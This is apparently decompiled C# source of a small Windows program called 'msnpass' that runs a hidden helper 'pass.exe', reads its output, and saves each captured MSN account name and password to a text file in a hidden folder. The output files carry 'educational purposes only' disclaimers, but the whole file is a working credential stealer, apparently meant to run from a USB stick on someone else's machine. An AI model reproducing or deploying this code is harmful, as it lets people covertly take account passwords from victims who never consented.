using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;

namespace msnpass;

internal static class Program
{
	[STAThread]
	private static void Main()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		Random random = new Random();
		int num = random.Next(10);
		if (num == 5)
		{
			MessageBox.Show("The bastard next to you is hacking your msn password using his USB!!", "Error: VIRUS www.dngloz.com");
		}
		Process process = new Process();
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.RedirectStandardOutput = true;
		process.StartInfo.FileName = "pass.exe";
		process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo.CreateNoWindow = true;
		process.Start();
		string text = process.StandardOutput.ReadToEnd();
		string[] array = text.Split(new char[1] { '\n' });
		process.WaitForExit();
		string[] array2 = new string[array.Length];
		string[] array3 = new string[array.Length];
		Directory.CreateDirectory("PAS");
		DirectoryInfo directoryInfo = new DirectoryInfo("PAS");
		directoryInfo.Attributes = FileAttributes.Hidden;
		for (int i = 0; i < array.Length - 2; i++)
		{
			string[] array4 = array[i].Split(new char[1] { ' ' });
			array2[i] = array4[1];
			array3[i] = array4[3];
			using StreamWriter streamWriter = new StreamWriter("PAS/" + array2[i] + ".txt");
			streamWriter.WriteLine("Don't be an idiot and ruin someones life...");
			streamWriter.WriteLine("This is for educational purposes only!");
			streamWriter.WriteLine("You are fully responsible on how you use it.");
			streamWriter.WriteLine();
			streamWriter.WriteLine("----- http://www.dngloz.com -----");
			streamWriter.WriteLine();
			streamWriter.WriteLine("Password: " + array3[i]);
		}
	}
}
